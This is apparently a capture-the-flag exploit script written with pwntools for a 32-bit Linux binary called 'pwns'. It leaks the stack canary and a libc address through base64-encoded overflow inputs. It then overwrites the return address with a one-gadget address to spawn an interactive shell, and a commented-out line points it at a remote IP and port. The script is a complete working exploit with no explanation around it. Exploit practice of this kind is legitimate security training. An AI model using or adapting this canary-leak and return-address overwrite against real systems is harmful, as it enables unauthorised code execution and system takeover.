#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import base64
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x08048B09'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

local_MAGIC = 0x0003AC69

io = process('/home/h11p/hackme/huxiangbei/pwns')

#io = remote('104.224.169.128', 18887)

#debug()

#getCanary
payload = 'a'*0x102
io.recvuntil('May be I can know if you give me some data[Y/N]\n')
io.sendline('Y')
io.recvuntil('Give me some datas:\n')
io.send(base64.b64encode(payload))
io.recvline()
myCanary=io.recv()[268:271]
Canary="\x00"+myCanary
print "Canary:"+hex(u32(Canary))

#getlibc
#debug()
payload = 'a'*0x151
io.recvuntil('May be I can know if you give me some data[Y/N]\n')
io.sendline('Y')
io.recvuntil('Give me some datas:\n')
io.send(base64.b64encode(payload))
io.recvline()
mylibc=io.recv()[347:351]
base_libc=u32(mylibc)-0x18637
print "mylibc_addr:"+hex(base_libc)


#pwn
#debug()
MAGIC_addr=local_MAGIC+base_libc
payload = 'a'*0x101+Canary+"a"*0xc+p32(MAGIC_addr)
io.recvuntil('May be I can know if you give me some data[Y/N]\n')
io.sendline('Y')
io.recvuntil('Give me some datas:\n')
io.send(base64.b64encode(payload))


io.interactive()
io.close()

